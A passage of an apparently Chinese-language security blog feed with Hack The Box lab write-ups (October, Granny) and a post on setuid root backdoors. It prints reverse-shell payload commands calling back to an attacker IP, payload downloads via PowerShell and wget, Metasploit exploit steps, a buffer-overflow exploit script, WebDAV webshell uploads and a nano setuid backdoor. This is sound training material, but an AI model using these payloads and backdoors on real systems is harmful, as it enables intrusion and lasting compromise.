class="hljs-string">MB</span><br><span class="hljs-attr">Virtual Memory: Max Size:</span>  <span class="hljs-number">2.048</span> <span class="hljs-string">MB</span><br><span class="hljs-attr">Virtual Memory: Available:</span> <span class="hljs-number">1.209</span> <span class="hljs-string">MB</span><br><span class="hljs-attr">Virtual Memory: In Use:</span>    <span class="hljs-number">839</span> <span class="hljs-string">MB</span><br><span class="hljs-string">Page</span> <span class="hljs-string">File</span> <span class="hljs-string">Location(s):</span>     <span class="hljs-string">C:\pagefile.sys</span><br><span class="hljs-attr">Domain:</span>                    <span class="hljs-string">HTB</span><br><span class="hljs-attr">Logon Server:</span>              <span class="hljs-string">N/A</span><br><span class="hljs-string">Hotfix(s):</span>                 <span class="hljs-string">N/A</span><br><span class="hljs-string">Network</span> <span class="hljs-string">Card(s):</span>           <span class="hljs-number">1</span> <span class="hljs-string">NIC(s)</span> <span class="hljs-string">Installed.</span><br>                           [<span class="hljs-number">01</span>]<span class="hljs-string">:</span> <span class="hljs-string">Intel(R)</span> <span class="hljs-string">PRO/1000</span> <span class="hljs-string">MT</span> <span class="hljs-string">Network</span> <span class="hljs-string">Connection</span><br>                                 <span class="hljs-attr">Connection Name:</span> <span class="hljs-string">Local</span> <span class="hljs-string">Area</span> <span class="hljs-string">Connection</span><br>                                 <span class="hljs-attr">DHCP Enabled:</span>    <span class="hljs-literal">No</span><br>                                 <span class="hljs-string">IP</span> <span class="hljs-string">address(es)</span><br>                                 [<span class="hljs-number">01</span>]<span class="hljs-string">:</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span><br><br></code></pre></div></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>本地执行：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">msfvenom</span> -p windows/x<span class="hljs-number">64</span>/meterpreter/reverse_tcp LHOST=<span class="hljs-string">&quot;10.10.14.7&quot;</span> LPORT=<span class="hljs-number">7767</span> -f exe -o m.exe<br><span class="hljs-attribute">msf</span>执行监听，本地ip，端口<span class="hljs-number">7767</span><br></code></pre></div></td></tr></table></figure><p>shell执行：</p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">cd C:\Users\tolis\Desktop<br>powershell &quot;(new-object System.Net.WebClient).Downloadfile(&#x27;http://10.10.14.7/m.exe&#x27;, &#x27;m.exe&#x27;)&quot;<br><span class="hljs-keyword">start</span> p.exe 成功反弹metepreter<br><br>[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span> - exploit/windows/<span class="hljs-keyword">local</span>/ms10_092_schelevator: The target appears <span class="hljs-keyword">to</span> be vulnerable.<br>[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span> - exploit/windows/<span class="hljs-keyword">local</span>/ms16_014_wmi_recv_notif: The target appears <span class="hljs-keyword">to</span> be vulnerable.<br>[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span> - exploit/windows/<span class="hljs-keyword">local</span>/ms16_075_reflection: The target appears <span class="hljs-keyword">to</span> be vulnerable.<br><br>use exploit/windows/<span class="hljs-keyword">local</span>/ms10_092_schelevator<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">SESSION</span> <span class="hljs-number">1</span><br><span class="hljs-keyword">set</span> LHOST xxxx<br>run<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-26/7.PNG" alt="7"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学习了burp设置代理，达到访问127.0.0.1等于访问远程的效果。</p><p>msf设置RHOST为127.0.0.1，burp可以拦截msf发送的数据包</p>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
      <tag>file upload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>权限管理二：如何通过setuid设置root后门</title>
    <link href="/2019/02/24/x/"/>
    <url>/2019/02/24/x/</url>
    
    <content type="html"><![CDATA[<p>上一篇：<a href="https://whale3070.github.io/linux/2016/03/03/%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86/">权限管理</a></p><p>参考资料：<br><a href="https://gist.github.com/dergachev/7916152">https://gist.github.com/dergachev/7916152</a> 、<a href="https://pentestlab.blog/tag/find/">https://pentestlab.blog/tag/find/</a></p><h2 id="为什么你不能做到，在一个已经被渗透的机器上禁止提权？"><a href="#为什么你不能做到，在一个已经被渗透的机器上禁止提权？" class="headerlink" title="为什么你不能做到，在一个已经被渗透的机器上禁止提权？"></a>为什么你不能做到，在一个已经被渗透的机器上禁止提权？</h2><p>假设某人临时获得了root权限访问了你的系统，即使你禁止了提权的方式，他们仍然<br>有数不清的方式在以后重新访问你的系统。</p><p>简单提一下一些明显的方法：</p><ul><li>添加/root/.ssh/authorized_keys</li><li>添加新用户</li><li>运行恶意软件</li><li>使用cron job定时任务</li></ul><p>使用setuid可以使得任何用户运行root权限，而且你甚至不知道系统是否被入侵过。</p><p>案例：nano</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">ssh root@target<br><br>whoami                 <span class="hljs-comment">#    root</span><br>ls -al <span class="hljs-regexp">/bin/</span>nano       <span class="hljs-comment">#    -rwxr-xr-x 1 root root 191976 2010-02-01 20:30 /bin/nano</span><br><br>chmod u+s <span class="hljs-regexp">/bin/</span>nano    <span class="hljs-comment"># installs the backdoor</span><br><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-24/4.PNG" alt="4"></p><p>一旦nano 后门被设置，之后hacker可以用非root用户获取到root权限。</p><p>例如：<code>nano /root/.ssh/authorized_keys </code></p><ul><li><p>一旦系统被黑，特别是获取到root权限，你就再也不能信任它了。你必须找到源头漏洞在哪里，<br>然后用一个干净的系统重置，并且打上补丁。</p></li><li><p>通常，你不能允许任何不信任的组织使用shell连入系统，因为你可能对linux漏洞的知识不精通。</p></li></ul><h2 id="检查suid的bash-script"><a href="#检查suid的bash-script" class="headerlink" title="检查suid的bash script"></a>检查suid的bash script</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">cd</span> /tmp<br>find / -perm -4000 2&gt;/dev/null &gt; examSUID.txt<br>cat examSUID.txt | grep -E <span class="hljs-string">&quot;nmap|vim|find|bash|more|less|nano|cp&quot;</span><br>rm /tmp/examSUID.txt<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-24/5.PNG" alt="5"></p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>october（弱密码+文件上传）</title>
    <link href="/2019/02/23/x/"/>
    <url>/2019/02/23/x/</url>
    
    <content type="html"><![CDATA[<p>10.10.14.7</p><figure class="highlight coq"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs coq"><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">6.6</span><span class="hljs-number">.1</span>p1 Ubuntu <span class="hljs-number">2</span>ubuntu2<span class="hljs-number">.8</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br>| <span class="hljs-type">ssh</span>-hostkey: <br>|   <span class="hljs-type">1024</span> <span class="hljs-number">79</span>:b1:<span class="hljs-number">35</span>:b6:d1:<span class="hljs-number">25</span>:<span class="hljs-number">12</span>:a3:<span class="hljs-number">0</span>c:b5:<span class="hljs-number">2</span>e:<span class="hljs-number">36</span>:<span class="hljs-number">9</span>c:<span class="hljs-number">33</span>:<span class="hljs-number">26</span>:<span class="hljs-number">28</span> (DSA)<br>|   <span class="hljs-type">2048</span> <span class="hljs-number">16</span>:<span class="hljs-number">08</span>:<span class="hljs-number">68</span>:<span class="hljs-number">51</span>:d1:<span class="hljs-number">7</span>b:<span class="hljs-number">07</span>:<span class="hljs-number">5</span>a:<span class="hljs-number">34</span>:<span class="hljs-number">66</span>:<span class="hljs-number">0</span>d:<span class="hljs-number">4</span>c:d0:<span class="hljs-number">25</span>:<span class="hljs-number">56</span>:f5 (RSA)<br>|   <span class="hljs-type">256</span> e3:<span class="hljs-number">97</span>:a7:<span class="hljs-number">92</span>:<span class="hljs-number">23</span>:<span class="hljs-number">72</span>:bf:<span class="hljs-number">1</span>d:<span class="hljs-number">09</span>:<span class="hljs-number">88</span>:<span class="hljs-number">85</span>:b6:<span class="hljs-number">6</span>c:<span class="hljs-number">17</span>:<span class="hljs-number">4</span>e:<span class="hljs-number">85</span> (ECDSA)<br>|<span class="hljs-type">_</span>  <span class="hljs-number">256</span> <span class="hljs-number">89</span>:<span class="hljs-number">85</span>:<span class="hljs-number">90</span>:<span class="hljs-number">98</span>:<span class="hljs-number">20</span>:bf:<span class="hljs-number">03</span>:<span class="hljs-number">5</span>d:<span class="hljs-number">35</span>:<span class="hljs-number">7</span>f:<span class="hljs-number">4</span>a:a9:e1:<span class="hljs-number">1</span>b:<span class="hljs-number">65</span>:<span class="hljs-number">31</span> (ED25519)<br><span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.7</span> ((Ubuntu))<br>| <span class="hljs-type">http</span>-methods: <br>|<span class="hljs-type">_</span>  Potentially risky methods: PUT PATCH DELETE<br>|<span class="hljs-type">_http</span>-server-header: Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.7</span> (Ubuntu)<br>|<span class="hljs-type">_http</span>-title: October CMS - Vanilla<br>Service <span class="hljs-keyword">Info</span>: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></div></td></tr></table></figure><p>第一步，确定版本漏洞和exp<br>searchsploit Vanilla，</p><p>searchsploit october，没有直接可用exp</p><p>第二步，得知有很多exp，于是检查目标的详细版本</p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">nikto -h <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.16</span><br><br><span class="hljs-keyword">Server</span>: Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.7</span> (Ubuntu)<br>+ Retrieved x-powered-<span class="hljs-keyword">by</span> <span class="hljs-keyword">header</span>: PHP/<span class="hljs-number">5.5</span><span class="hljs-number">.9</span><span class="hljs-number">-1</span>ubuntu4<span class="hljs-number">.21</span><br></code></pre></div></td></tr></table></figure><p>手动翻网页，没有找到版本信息，于是dirbuster fuzz一下目录。</p><p>结果是目录很干净，除了论坛、用户、博客三个目录，有用信息不多。</p><p><a href="http://10.10.10.16/forum">http://10.10.10.16/forum</a></p><p>第三步，分析exp<br>searchsploit -m exploits/php/webapps/25720.txt<br>leafpad /root/Desktop/16/25720.txt</p><hr><p>找到了后台：<code>http://10.10.10.16/backend/backend/auth/signin</code><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-23/6.PNG" alt="6"></p><p>admin/admin，登陆成功</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-23/5.PNG" alt="5"><br>尝试文件上传，txt可以上传，php不可以，PHP不可以。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-23/7.PNG" alt="7"><br>但是php5可以，说明是黑名单的限制方式。</p><h2 id="获得一个shell"><a href="#获得一个shell" class="headerlink" title="获得一个shell"></a>获得一个shell</h2><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-23/8.PNG" alt="8"></p><h4 id="info-enum"><a href="#info-enum" class="headerlink" title="info enum:"></a>info enum:</h4><figure class="highlight ruby"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ruby"><span class="hljs-symbol">os:</span> Ubuntu <span class="hljs-number">14.04</span> (Linux <span class="hljs-number">4.4</span>.<span class="hljs-number">0</span>-<span class="hljs-number">78</span>-generic)<br><span class="hljs-symbol">whoami:</span> www-data<br>exist <span class="hljs-symbol">user:</span> <span class="hljs-symbol">syslog:</span><span class="hljs-symbol">x:</span><span class="hljs-number">101</span><span class="hljs-symbol">:</span><span class="hljs-number">104</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/home/syslog</span><span class="hljs-symbol">:/bin/false</span><br>      <span class="hljs-symbol">harry:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:Harry</span> Varthakouris,,,<span class="hljs-symbol">:/home/harry</span><span class="hljs-symbol">:/bin/bash</span><br></code></pre></div></td></tr></table></figure><h2 id="trying1：检查web-config文件，查找口令"><a href="#trying1：检查web-config文件，查找口令" class="headerlink" title="trying1：检查web config文件，查找口令"></a>trying1：检查web config文件，查找口令</h2><figure class="highlight erlang-repl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs erlang-repl">grep -R pass .<br>OctoberCMSPassword!!<br><br>python -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></div></td></tr></table></figure><p>获取bash shell，尝试用口令登陆。登陆farry用户失败。</p><h2 id="trying2-尝试数据库登陆"><a href="#trying2-尝试数据库登陆" class="headerlink" title="trying2: 尝试数据库登陆"></a>trying2: 尝试数据库登陆</h2><p>发现数据库以mysql用户运行。</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">ps</span> -ef | grep mysql<br><span class="hljs-attribute">mysql</span>     <span class="hljs-number">1197</span>     <span class="hljs-number">1</span>  <span class="hljs-number">0</span> Feb<span class="hljs-number">18</span> ?        <span class="hljs-number">00</span>:<span class="hljs-number">02</span>:<span class="hljs-number">16</span> /usr/sbin/mysqld<br><br><span class="hljs-attribute">netstat</span> -an<br><span class="hljs-attribute">unix</span>  <span class="hljs-number">2</span>     <span class="hljs-meta"> [ ACC ]     STREAM     LISTENING     10089    /var/run/mysqld/mysqld.sock</span><br></code></pre></div></td></tr></table></figure><h2 id="trying3-上传sh脚本"><a href="#trying3-上传sh脚本" class="headerlink" title="trying3: 上传sh脚本"></a>trying3: 上传sh脚本</h2><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-23/1.PNG" alt="1"><br>有gcc，于是可以尝试内核漏洞<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-23/2.PNG" alt="2"></p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">14.7</span>/dirty.c<br>wget http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">14.7</span>/dirtyc0w.c<br><br>wget http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">14.7</span>/chocobo_root <br>执行结果：i have no offsets <span class="hljs-keyword">for</span> this kernel version..<br></code></pre></div></td></tr></table></figure><p>执行了三个exp，都失败了</p><h2 id="trying4-上传msf反弹payload"><a href="#trying4-上传msf反弹payload" class="headerlink" title="trying4: 上传msf反弹payload"></a>trying4: 上传msf反弹payload</h2><p>msfconsole -r job.rc 执行监听</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">use exploit/multi/handler<br><span class="hljs-builtin-name">set</span> payload linux/x86/meterpreter/reverse_tcp<br><span class="hljs-builtin-name">set</span> LHOST 10.10.14.7<br><span class="hljs-builtin-name">set</span> LPORT 7766<br>run<br></code></pre></div></td></tr></table></figure><p>将载荷发送到目标机，并且运行。<br><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&quot;10.10.14.7&quot; LPORT=7766 -f elf -o 123</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-23/11.PNG" alt="11"></p><figure class="highlight applescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs applescript">[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.16</span> - exploit/linux/<span class="hljs-keyword">local</span>/apport_abrt_chroot_priv_esc: The target <span class="hljs-keyword">is</span> vulnerable.<br>[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.16</span> - exploit/linux/<span class="hljs-keyword">local</span>/netfilter_priv_esc_ipv4: The target appears <span class="hljs-keyword">to</span> be vulnerable.  编译时缺少模块libc6-dev-i386，失败<br>[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.16</span> - exploit/linux/<span class="hljs-keyword">local</span>/pkexec: The target service <span class="hljs-keyword">is</span> <span class="hljs-built_in">running</span>, <span class="hljs-keyword">but</span> could <span class="hljs-keyword">not</span> be validated. <br>[*] Post module execution completed<br><br><span class="hljs-keyword">set</span> SESSION <span class="hljs-number">1</span><br><span class="hljs-keyword">set</span> payload linux/x86/meterpreter/reverse_tcp<br><span class="hljs-keyword">set</span> LHOST <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.7</span><br><span class="hljs-keyword">set</span> LPORT <span class="hljs-number">8899</span><br>show options<br><span class="hljs-built_in">run</span> 失败<br></code></pre></div></td></tr></table></figure><h2 id="writeup-suid程序以及python-exploit编写"><a href="#writeup-suid程序以及python-exploit编写" class="headerlink" title="writeup: suid程序以及python exploit编写"></a>writeup: suid程序以及python exploit编写</h2><p>之前用脚本检查过suid权限，但是/usr/local/bin/ovrflw，并不是常见的suid 提权程序，于是被我忽略了…<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-23/3.PNG" alt="3"></p><p>ovrflw是一个二进制程序，有缓冲区溢出漏洞，可惜我还不会写利用程序。<br><code>cd /usr/local/bin;./ovrflw</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-23/4.PNG" alt="4"></p><p>overflow.py</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">import</span> struct, subprocess<br><span class="hljs-attribute">libcBase</span> = <span class="hljs-number">0</span>xb<span class="hljs-number">75</span>eb<span class="hljs-number">000</span><br><span class="hljs-attribute">systemOffset</span> = <span class="hljs-number">0</span>x<span class="hljs-number">00040310</span><br><span class="hljs-attribute">binShOffset</span> = <span class="hljs-number">0</span>x<span class="hljs-number">00162</span>bac<br><span class="hljs-attribute">libcAddress</span> = struct.pack(<span class="hljs-string">&quot;&lt;I&quot;</span>, libcBase+systemOffset)<br><span class="hljs-attribute">exitAddress</span> = struct.pack(<span class="hljs-string">&quot;&lt;I&quot;</span>, <span class="hljs-number">0</span>xd<span class="hljs-number">34</span>db<span class="hljs-number">33</span>f)<br><span class="hljs-attribute">binShAddress</span> = struct.pack(<span class="hljs-string">&quot;&lt;I&quot;</span>, libcBase+binShOffset)<br><span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;\x90&quot;</span>*<span class="hljs-number">112</span><br><span class="hljs-attribute">payload</span> += libcAddress<br><span class="hljs-attribute">payload</span> += exitAddress<br><span class="hljs-attribute">payload</span> += binShAddress<br><span class="hljs-attribute">i</span> = <span class="hljs-number">0</span><br><span class="hljs-attribute">while</span> True:<br><span class="hljs-attribute">i</span> += <span class="hljs-number">1</span><br><span class="hljs-attribute">if</span> i%<span class="hljs-number">10</span> == <span class="hljs-number">0</span>:<br><span class="hljs-attribute">print</span> <span class="hljs-string">&quot;Attempts: &quot;</span> + str(i)<br><span class="hljs-attribute">subprocess</span>.call([<span class="hljs-string">&quot;/usr/local/bin/ovrflw&quot;</span>, payload])<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-23/9.PNG" alt="9"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>编写python脚本，利用段错误，通过缓冲区溢出得到root权限，需要很多基础，不是一时半会儿能学会的。继续加油吧</p>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
      <tag>linux os</tag>
      
      <tag>cms</tag>
      
      <tag>file upload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Granny（webDAV put+move获取webshell）</title>
    <link href="/2019/02/22/x/"/>
    <url>/2019/02/22/x/</url>
    
    <content type="html"><![CDATA[<p>10.10.10.15</p><h2 id="scan"><a href="#scan" class="headerlink" title="scan"></a>scan</h2><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">80/tcp <span class="hljs-keyword">open</span>  http    Microsoft <span class="hljs-keyword">IIS</span> httpd 6.0<br><br>http-webdav-scan: <br>|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, <span class="hljs-keyword">COPY</span>, <span class="hljs-keyword">MOVE</span>, PROPFIND, PROPPATCH, <span class="hljs-keyword">SEARCH</span>, MKCOL, LOCK, UNLOCK<br>|   Server <span class="hljs-keyword">Type</span>: Microsoft-<span class="hljs-keyword">IIS</span>/6.0<br>|   WebDAV <span class="hljs-keyword">type</span>: Unkown<br>|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, <span class="hljs-keyword">POST</span>, <span class="hljs-keyword">COPY</span>, <span class="hljs-keyword">MOVE</span>, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, <span class="hljs-keyword">SEARCH</span><br>|_  Server Date: Mon, 18 Feb 2019 11:05:15 GMT<br></code></pre></div></td></tr></table></figure><p>搜索关键字“WebDAV”，检查一下 “Microsoft IIS WebDAV Write Access Code Execution”</p><h4 id="trying1"><a href="#trying1" class="headerlink" title="trying1"></a>trying1</h4><p>nikto -h 10.10.10.15</p><figure class="highlight oxygene"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs oxygene">+ OSVDB-<span class="hljs-number">397</span>: HTTP <span class="hljs-function"><span class="hljs-keyword">method</span> <span class="hljs-params">(<span class="hljs-string">&#x27;Allow&#x27;</span> Header)</span>:</span> <span class="hljs-string">&#x27;PUT&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">method</span> <span class="hljs-title">could</span> <span class="hljs-title">allow</span> <span class="hljs-title">clients</span> <span class="hljs-title">to</span> <span class="hljs-title">save</span> <span class="hljs-title">files</span> <span class="hljs-title">on</span> <span class="hljs-title">the</span> <span class="hljs-title">web</span> <span class="hljs-title">server</span>.</span><br><span class="hljs-function">+ <span class="hljs-title">OSVDB</span>-5647:</span> HTTP <span class="hljs-function"><span class="hljs-keyword">method</span> <span class="hljs-params">(<span class="hljs-string">&#x27;Allow&#x27;</span> Header)</span>:</span> <span class="hljs-string">&#x27;MOVE&#x27;</span> may allow clients <span class="hljs-keyword">to</span> change file locations <span class="hljs-keyword">on</span> the web server.<br><br></code></pre></div></td></tr></table></figure><p>参考资料：<a href="https://www.cnblogs.com/cnhacker/p/6999102.html">https://www.cnblogs.com/cnhacker/p/6999102.html</a><br><a href="https://www.cnblogs.com/softidea/p/6183660.html">curl常用方法</a></p><p>创建了1.html，成功<br>curl -X PUT <a href="http://10.10.10.15/1.html">http://10.10.10.15/1.html</a> -d “abcdef”</p><p>准备将php一句话写入1.html，失败</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">curl -X PUT http:<span class="hljs-comment">//10.10.10.15/1.html -d &quot;<span class="hljs-meta">&lt;?php</span> system($_GET[&#x27;cmd&#x27;]) <span class="hljs-meta">?&gt;</span>&quot;</span><br>curl -X MOVE --header <span class="hljs-string">&#x27;Destination:http://10.10.10.15/1.html&#x27;</span> <span class="hljs-string">&#x27;http://10.10.10.15/1.php&#x27;</span><br></code></pre></div></td></tr></table></figure><p>(nikto扫描结果)发现iis 用的是asp，而不是php.</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> -X PUT http://<span class="hljs-number">10.10.10.15</span>/<span class="hljs-number">1</span>.html -d <span class="hljs-string">&quot; &lt;%eval request(&quot;</span>cmd<span class="hljs-string">&quot;)%&gt; &quot;</span><br><span class="hljs-attribute">curl</span> -X MOVE --header &#x27;Destination:http://<span class="hljs-number">10.10.10.15</span>/<span class="hljs-number">1</span>.asp&#x27; http://<span class="hljs-number">10.10.10.15</span>/<span class="hljs-number">1</span>.html<br></code></pre></div></td></tr></table></figure><h2 id="msf：获得一个shell"><a href="#msf：获得一个shell" class="headerlink" title="msf：获得一个shell"></a>msf：获得一个shell</h2><p>job.rc :</p><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata"><span class="hljs-keyword">use</span> exploit/windows/<span class="hljs-keyword">iis</span>/iis_webdav_upload_asp<br><span class="hljs-keyword">set</span> RHOST 10.10.10.15<br><span class="hljs-keyword">set</span> LHOST 10.10.14.3<br><span class="hljs-keyword">run</span><br></code></pre></div></td></tr></table></figure><p>msfconsole -r job.rc</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-22/3.PNG" alt="3"></p><h4 id="info"><a href="#info" class="headerlink" title="info:"></a>info:</h4><p>Windows Server 2003</p><figure class="highlight crmsh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs crmsh"><span class="hljs-keyword">User</span> <span class="hljs-title">accounts</span> for 